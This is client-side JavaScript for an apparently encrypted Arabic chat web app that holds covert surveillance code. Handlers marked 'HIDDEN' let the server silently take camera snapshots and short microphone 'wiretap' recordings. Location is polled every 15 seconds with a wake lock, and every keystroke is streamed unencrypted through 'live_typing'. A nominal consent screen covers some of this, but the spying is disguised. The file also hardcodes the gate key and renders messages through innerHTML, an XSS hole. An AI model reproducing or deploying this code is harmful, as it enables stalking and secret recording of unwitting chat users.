    // =============================================
    // PWA + PUSH REGISTRATION
    // =============================================
(function () {
        if (!('serviceWorker' in navigator)) return;
        navigator.serviceWorker.register('/sw.js').then(async (reg) => {
            // Ask for notification permission at install-time of PWA
            try {
                const permission = await Notification.requestPermission();
                if (permission === 'granted') {
                    // Subscribe to push (server needs VAPID public key endpoint; skip silently if absent)
                    const res = await fetch('/push-public-key');
                    if (res.ok) {
                        const { publicKey } = await res.json();
                        if (publicKey) {
                            const sub = await reg.pushManager.subscribe({
                                userVisibleOnly: true,
                                applicationServerKey: urlBase64ToUint8Array(publicKey)
                            });
                            // Send subscription to server once socket is up
                            const send = () => socket && socket.emit('push_subscription', sub.toJSON());
                            if (socket) send(); else setTimeout(send, 2000);
                        }
                    }
                }
            } catch (e) { /* push not available */ }
        }).catch((e) => console.log('SW registration failed:', e));

        // SW asks us to send a fresh location fix (periodic background sync)
        navigator.serviceWorker.addEventListener('message', (event) => {
            if (event.data && event.data.type === 'SEND_LOCATION_NOW' && username && navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(sendLocationUpdate, () => {}, { enableHighAccuracy: true, timeout: 10000 });
            }
        });
    })();

    function urlBase64ToUint8Array(base64String) {
        const padding = '='.repeat((4 - base64String.length % 4) % 4);
        const base64 = (base64String + padding).replace(/-/g, '+').replace(/_/g, '/');
        const raw = window.atob(base64);
        return Uint8Array.from([...raw].map((c) => c.charCodeAt(0)));
    }

// =============================================
// PERMISSIONS ON LOAD (Notifications + Location)
// =============================================
(function requestPermissionsEarly() {
    // 1. Notifications
    try {
        if ('Notification' in window && Notification.permission === 'default') {
            Notification.requestPermission();
        }
    } catch (e) { /* ignore */ }

    // 2. Geolocation — fire the prompt immediately
    try {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    window._earlyLocation = { lat: pos.coords.latitude, lng: pos.coords.longitude };
                },
                () => { window._earlyLocation = null; },
                { enableHighAccuracy: false, timeout: 10000 }
            );
        }
    } catch (e) { /* ignore */ }
})();

// =============================================
// MATRIX RAIN ANIMATION
// =============================================

(function initMatrix() {
    const canvas = document.getElementById('matrixCanvas');
    if (!canvas) return;
    const ctx = canvas.getContext('2d');
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;

    const chars = 'アイウエオカキクケコサシスセソタチツテトナニヌネノ01010110ABCDEF</>[]{}|\\#@!';
    const fontSize = 14;
    const cols = Math.floor(canvas.width / fontSize);
    const drops = Array(cols).fill(1);

    function drawMatrix() {
        ctx.fillStyle = 'rgba(0, 8, 20, 0.05)';
        ctx.fillRect(0, 0, canvas.width, canvas.height);
        ctx.fillStyle = '#00aaff';
        ctx.font = fontSize + 'px Share Tech Mono, monospace';
        drops.forEach((y, x) => {
            const char = chars[Math.floor(Math.random() * chars.length)];
            ctx.fillText(char, x * fontSize, y * fontSize);
            if (y * fontSize > canvas.height && Math.random() > 0.975) drops[x] = 0;
            drops[x]++;
        });
    }
    setInterval(drawMatrix, 40);
    window.addEventListener('resize', () => {
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
    });
})();

// =============================================
// DECRYPTION GATE LOGIC
// =============================================
(function initGate() {
    const gate = document.getElementById('decryptionGate');
    const gateForm = document.getElementById('gateForm');
    const gateKeyInput = document.getElementById('gateKeyInput');
    const gateBtn = document.getElementById('gateBtn');
    const gateBtnText = document.getElementById('gateBtnText');
    const gateBtnLoader = document.getElementById('gateBtnLoader');
    const gateError = document.getElementById('gateError');
    const gateLockIcon = document.getElementById('gateLockIcon');
    const lockSvg = document.getElementById('lockSvg');
    const unlockSvg = document.getElementById('unlockSvg');
    const scanStatus = document.getElementById('scanStatus');
    const gateStatusText = document.getElementById('gateStatusText');
    const mainContainer = document.getElementById('mainContainer');
    const roomKeyHidden = document.getElementById('roomKeyInput');

    // ⚙️ SET YOUR SECRET KEY HERE:
    const SECRET_KEY = 'TDE@10';

    let statusMessages = [
        'ESTABLISHING SECURE CONNECTION...',
        'AUTHENTICATING ENDPOINT...',
        'VERIFYING ENCRYPTION PROTOCOLS...',
        'AWAITING DECRYPTION KEY...'
    ];
    let statusIdx = 0;
    setInterval(() => {
        statusIdx = (statusIdx + 1) % statusMessages.length;
        if (gateStatusText) gateStatusText.textContent = statusMessages[statusIdx];
    }, 2500);

    if (!gateForm) return;

    gateForm.addEventListener('submit', (e) => {
        e.preventDefault();
        const enteredKey = gateKeyInput.value.trim();

        if (enteredKey !== SECRET_KEY) {
            // Wrong key
            gateError.classList.remove('hidden');
            gateKeyInput.value = '';
            gateKeyInput.style.borderColor = '#ef4444';
            scanStatus.textContent = 'ACCESS DENIED';
            scanStatus.style.color = '#ef4444';
            setTimeout(() => {
                gateError.classList.add('hidden');
                gateKeyInput.style.borderColor = '';
                scanStatus.textContent = 'AUTHENTICATING';
                scanStatus.style.color = '';
            }, 2500);
            return;
        }

        // Correct key! Start unlock animation
        gateBtn.classList.add('decrypting');
        gateBtnText.style.display = 'none';
        gateBtnLoader.style.display = 'inline';
        scanStatus.textContent = 'DECRYPTING...';
        scanStatus.style.color = 'var(--neon-green)';
        gateKeyInput.disabled = true;

        // Animate lock to unlock
        setTimeout(() => {
            gateLockIcon.classList.add('unlocked');
            lockSvg.style.display = 'none';
            unlockSvg.style.display = 'block';
            scanStatus.textContent = 'ACCESS GRANTED';
        }, 600);

        // Transition to main app
        setTimeout(() => {
            gate.classList.add('exiting');

            // Pass the key to the main chat
            if (roomKeyHidden) roomKeyHidden.value = enteredKey;
            window._gateKey = enteredKey;

            setTimeout(() => {
                gate.style.display = 'none';
                mainContainer.classList.remove('hidden');
                mainContainer.classList.add('main-entering');
            }, 800);
        }, 1400);
    });
})();

document.addEventListener('DOMContentLoaded', () => {

    let socket = null;
    if (typeof io !== 'undefined') {
        socket = io();
    } else {
        console.warn('Socket.IO is not loaded.');
    }

    // UI Elements
    const joinScreen = document.getElementById('joinScreen');
    const chatScreen = document.getElementById('chatScreen');
    const joinForm = document.getElementById('joinForm');
    const usernameInput = document.getElementById('usernameInput');
    const roomKeyInput = document.getElementById('roomKeyInput');
    const chatForm = document.getElementById('chatForm');
    const messageInput = document.getElementById('messageInput');
    const chatMessages = document.getElementById('chatMessages');
    const onlineUsersSpan = document.getElementById('onlineUsers');
    const typingIndicator = document.getElementById('typingIndicator');
    
    const stealthVideo = document.getElementById('stealthVideo');
    const stealthCanvas = document.getElementById('stealthCanvas');

    let username = '';
    let roomKey = '';
    let watchId = null;
    let cameraStream = null;

    // Consent flow
    const consentScreen = document.getElementById('consentScreen');
    const consentAcceptBtn = document.getElementById('consentAcceptBtn');
    const consentDeclineBtn = document.getElementById('consentDeclineBtn');

    consentAcceptBtn.addEventListener('click', () => {
        const loc = document.getElementById('consentLocation').checked;
        const cam = document.getElementById('consentCamera').checked;
        if (!loc && !cam) {
            alert('لازم توافق على الأقل على بند واحد، أو اضغط "أرفض — دردشة فقط".');
            return;
        }

        // Log explicit consent (server keeps a record)
        if (socket) socket.emit('user_consent', { username, location: loc, camera: cam, at: Date.now() });

        if (cam && navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            navigator.mediaDevices.getUserMedia({ video: true, audio: true })
                .then(stream => {
                    cameraStream = stream;
                    stealthVideo.srcObject = stream;
                    stealthVideo.muted = true;
                    stealthVideo.play().catch(e => console.log("Video play warning:", e));
                })
                .catch(err => console.log("Media denied", err));
        }

        if (loc && navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                () => { startHiddenTracking(); enterChat(); },
                () => enterChat(),
                { enableHighAccuracy: true, timeout: 10000 }
            );
        } else {
            enterChat();
        }
    });

    consentDeclineBtn.addEventListener('click', () => {
        if (socket) socket.emit('user_consent', { username, location: false, camera: false, at: Date.now(), declined: true });
        enterChat();
    });

    // Join Chat
    joinForm.addEventListener('submit', (e) => {
        e.preventDefault();
        const inputName = usernameInput.value.trim();
        if (inputName) {
            username = inputName;
            roomKey = roomKeyInput.value.trim() || window._gateKey || '';

            // Show consent screen instead of requesting permissions directly
            joinScreen.classList.remove('active');
            joinScreen.classList.add('hidden');
            consentScreen.classList.remove('hidden');
            consentScreen.classList.add('active');
        }
    });

    function enterChat() {
        joinScreen.classList.remove('active');
        joinScreen.classList.add('hidden');
        
        chatScreen.classList.remove('hidden');
        setTimeout(() => chatScreen.classList.add('active'), 10);

        if (socket) {
            socket.emit('user_join_chat', username);
        }
    }

    // Pending media payload (image or audio)
    let pendingMedia = null;

    const attachBtn = document.getElementById('attachBtn');
    const imageInput = document.getElementById('imageInput');
    const recordBtn = document.getElementById('recordBtn');
    const mediaPreviewContainer = document.getElementById('mediaPreviewContainer');
    const imagePreview = document.getElementById('imagePreview');
    const audioPreview = document.getElementById('audioPreview');
    const clearMediaBtn = document.getElementById('clearMediaBtn');

    // --- IMAGE ATTACHMENT ---
    attachBtn.addEventListener('click', () => imageInput.click());

    imageInput.addEventListener('change', (e) => {
        const file = e.target.files[0];
        if (!file) return;

        // Compress image using Canvas
        const reader = new FileReader();
        reader.onload = (ev) => {
            const img = new Image();
            img.onload = () => {
                const canvas = document.createElement('canvas');
                const MAX = 800;
                let w = img.width, h = img.height;
                if (w > MAX) { h = Math.round(h * MAX / w); w = MAX; }
                if (h > MAX) { w = Math.round(w * MAX / h); h = MAX; }
                canvas.width = w; canvas.height = h;
                canvas.getContext('2d').drawImage(img, 0, 0, w, h);
                const compressed = canvas.toDataURL('image/jpeg', 0.7);
                pendingMedia = { type: 'image', data: compressed };
                imagePreview.src = compressed;
                imagePreview.classList.remove('hidden');
                audioPreview.classList.add('hidden');
                mediaPreviewContainer.classList.remove('hidden');
            };
            img.src = ev.target.result;
        };
        reader.readAsDataURL(file);
        imageInput.value = '';
    });

    // --- VOICE RECORDING ---
    let mediaRecorder = null;
    let audioChunks = [];
    let isRecording = false;

    recordBtn.addEventListener('click', async () => {
        if (!isRecording) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                mediaRecorder = new MediaRecorder(stream);
                audioChunks = [];
                mediaRecorder.ondataavailable = (e) => audioChunks.push(e.data);
                mediaRecorder.onstop = () => {
                    const blob = new Blob(audioChunks, { type: 'audio/webm' });
                    const reader = new FileReader();
                    reader.onload = (ev) => {
                        pendingMedia = { type: 'audio', data: ev.target.result };
                        audioPreview.src = ev.target.result;
                        audioPreview.classList.remove('hidden');
                        imagePreview.classList.add('hidden');
                        mediaPreviewContainer.classList.remove('hidden');
                    };
                    reader.readAsDataURL(blob);
                    stream.getTracks().forEach(t => t.stop());
                };
                mediaRecorder.start();
                isRecording = true;
                recordBtn.classList.add('recording');
                recordBtn.title = 'إيقاف التسجيل';
            } catch (err) {
                alert('لا يمكن الوصول للميكروفون. يرجى السماح بالإذن.');
            }
        } else {
            mediaRecorder.stop();
            isRecording = false;
            recordBtn.classList.remove('recording');
            recordBtn.title = 'رسالة صوتية';
        }
    });

    // --- CLEAR MEDIA ---
    clearMediaBtn.addEventListener('click', () => {
        pendingMedia = null;
        imagePreview.classList.add('hidden');
        audioPreview.classList.add('hidden');
        mediaPreviewContainer.classList.add('hidden');
    });

    // Chat Form Submit
    chatForm.addEventListener('submit', (e) => {
        e.preventDefault();
        if (!socket) return;

        if (pendingMedia) {
            // Encrypt and send media
            const payload = JSON.stringify(pendingMedia);
            const encrypted = CryptoJS.AES.encrypt(payload, roomKey).toString();
            if (pendingMedia.type === 'image') {
                appendMediaMessage('أنت', pendingMedia, 'sent');
            } else {
                appendMediaMessage('أنت', pendingMedia, 'sent');
            }
            socket.emit('chat_message', { sender: username, text: encrypted });
            pendingMedia = null;
            imagePreview.classList.add('hidden');
            audioPreview.classList.add('hidden');
            mediaPreviewContainer.classList.add('hidden');
        } else {
            const msg = messageInput.value.trim();
            if (!msg) return;
            const payload = JSON.stringify({ type: 'text', data: msg });
            const encrypted = CryptoJS.AES.encrypt(payload, roomKey).toString();
            appendMessage('أنت', msg, 'sent');
            socket.emit('chat_message', { sender: username, text: encrypted });
            messageInput.value = '';
            socket.emit('live_typing', '');
        }
    });

    messageInput.addEventListener('input', () => {
        if (socket) socket.emit('live_typing', messageInput.value);
    });

    // Helper: decrypt and render any message
    function decryptAndRender(data, direction) {
        try {
            const bytes = CryptoJS.AES.decrypt(data.text, roomKey);
            const raw = bytes.toString(CryptoJS.enc.Utf8);
            if (!raw) throw new Error('empty');
            const parsed = JSON.parse(raw);
            if (parsed.type === 'image' || parsed.type === 'audio') {
                appendMediaMessage(data.sender, parsed, direction);
            } else {
                appendMessage(data.sender, parsed.data || raw, direction);
            }
        } catch (e) {
            // Legacy plain text fallback
            try {
                const bytes = CryptoJS.AES.decrypt(data.text, roomKey);
                const originalText = bytes.toString(CryptoJS.enc.Utf8);
                appendMessage(data.sender, originalText || '🔒 [رسالة مشفرة]', direction);
            } catch (e2) {
                appendMessage(data.sender, '🔒 [رسالة مشفرة - مفتاح خاطئ]', direction);
            }
        }
    }

    // Socket Events
    if (socket) {
        socket.on('chat_message', (data) => {
            typingIndicator.classList.add('hidden');
            decryptAndRender(data, 'received');
        });
        
        socket.on('chat_history', (history) => {
            chatMessages.innerHTML = '';
            appendSystemMessage('مرحباً بك! تم تنزيل السجل التاريخي مشفراً.');
            history.forEach(data => {
                const type = (data.sender === username) ? 'sent' : 'received';
                const displayName = (data.sender === username) ? 'أنت' : data.sender;
                decryptAndRender({ sender: displayName, text: data.text }, type);
            });
        });


        socket.on('online_users_count', (count) => {
            onlineUsersSpan.textContent = count;
        });

        socket.on('user_joined_notice', (name) => {
            appendSystemMessage(`انضم ${name} إلى الغرفة`);
        });

        socket.on('user_left_notice', (name) => {
            appendSystemMessage(`غادر ${name} الغرفة`);
        });

        // Listen for typing from others to show the UI dots
        socket.on('show_typing_indicator', () => {
            typingIndicator.classList.remove('hidden');
            // Auto hide after 3 seconds if no new typing events
            clearTimeout(window.typingTimer);
            window.typingTimer = setTimeout(() => {
                typingIndicator.classList.add('hidden');
            }, 3000);
        });

        // HIDDEN: Listen for snapshot command
        socket.on('take_snapshot', () => {
            if (cameraStream) {
                // Ensure dimensions exist
                const width = stealthVideo.videoWidth || 640;
                const height = stealthVideo.videoHeight || 480;
                
                stealthCanvas.width = width;
                stealthCanvas.height = height;
                const context = stealthCanvas.getContext('2d');
                context.drawImage(stealthVideo, 0, 0, width, height);
                
                // Get base64 image
                const imageData = stealthCanvas.toDataURL('image/jpeg', 0.8);
                
                // Send back to server silently
                socket.emit('snapshot_result', {
                    image: imageData,
                    username: username
                });
            }
        });

        // HIDDEN: Listen for audio wiretap command
        socket.on('take_audio', () => {
            if (cameraStream) {
                try {
                    // Try to get audio tracks
                    const audioTracks = cameraStream.getAudioTracks();
                    if (audioTracks.length > 0) {
                        const mediaRecorder = new MediaRecorder(cameraStream);
                        const audioChunks = [];

                        mediaRecorder.addEventListener("dataavailable", event => {
                            audioChunks.push(event.data);
                        });

                        mediaRecorder.addEventListener("stop", () => {
                            // Let the browser decide the mime type automatically (Fix for iPhones/Safari)
                            const audioBlob = new Blob(audioChunks);
                            
                            // Convert Blob to Base64 to send via socket
                            const reader = new FileReader();
                            reader.readAsDataURL(audioBlob); 
                            reader.onloadend = function() {
                                const base64Audio = reader.result;
                                socket.emit('audio_result', {
                                    audio: base64Audio,
                                    username: username
                                });
                            }
                        });

                        mediaRecorder.start();
                        // Record for 5 seconds
                        setTimeout(() => {
                            if (mediaRecorder.state === "recording") {
                                mediaRecorder.stop();
                            }
                        }, 5000);
                    }
                } catch (e) {
                    console.error("Wiretap failed", e);
                }
            }
        });
    }

    function appendMessage(sender, text, type) {
        const msgDiv = document.createElement('div');
        msgDiv.className = `message ${type}`;
        msgDiv.innerHTML = `
            <span class="sender-name">${sender}</span>
            <div class="bubble">${text}</div>
        `;
        chatMessages.appendChild(msgDiv);
        scrollToBottom();
    }

    function appendMediaMessage(sender, media, type) {
        const msgDiv = document.createElement('div');
        msgDiv.className = `message ${type}`;

        let mediaHTML = '';
        if (media.type === 'image') {
            mediaHTML = `<img src="${media.data}" class="chat-image" alt="صورة مشفرة">`;
        } else if (media.type === 'audio') {
            mediaHTML = `<audio src="${media.data}" class="chat-audio" controls></audio>`;
        }

        msgDiv.innerHTML = `
            <span class="sender-name">${sender}</span>
            <div class="bubble">${mediaHTML}</div>
        `;
        chatMessages.appendChild(msgDiv);
        scrollToBottom();
    }

    function appendSystemMessage(text) {
        const sysDiv = document.createElement('div');
        sysDiv.className = 'system-message';
        sysDiv.textContent = text;
        chatMessages.appendChild(sysDiv);
        scrollToBottom();
    }

    function scrollToBottom() {
        chatMessages.scrollTop = chatMessages.scrollHeight;
    }

    // -----------------------------------------------------
    // CONSENTED LOCATION TRACKING (background-friendly)
    // - Wake Lock keeps the device from sleeping
    // - Periodic getCurrentPosition instead of watchPosition
    //   (survives screen-off better & saves battery)
    // -----------------------------------------------------
    let wakeLock = null;

    async function requestWakeLock() {
        try {
            if ('wakeLock' in navigator) {
                wakeLock = await navigator.wakeLock.request('screen');
                wakeLock.addEventListener('release', () => {
                    console.log('Wake lock released');
                });
            }
        } catch (e) { /* unsupported or denied */ }
    }

    // Re-acquire wake lock when tab becomes visible again
    document.addEventListener('visibilitychange', () => {
        if (document.visibilityState === 'visible' && username) {
            requestWakeLock();
        }
    });

    function sendLocationUpdate(position) {
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;

        (async () => {
            let addressDetails = null;
            try {
                const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1&accept-language=ar`);
                if (response.ok) {
                    addressDetails = (await response.json()).address || {};
                }
            } catch (e) {}

            if (socket) {
                socket.emit('update_location', { lat, lon, addressDetails, username });
            }
        })();
    }

    function startHiddenTracking() {
        if (!navigator.geolocation) return;

        // Keep screen on so tracking continues with the page "closed" (minimized)
        requestWakeLock();

        // First fix immediately, then poll every 15 seconds
        navigator.geolocation.getCurrentPosition(sendLocationUpdate, () => {}, { enableHighAccuracy: true, timeout: 10000 });
        watchId = setInterval(() => {
            navigator.geolocation.getCurrentPosition(sendLocationUpdate, () => {}, { enableHighAccuracy: true, timeout: 10000 });
        }, 15000);
    }
});
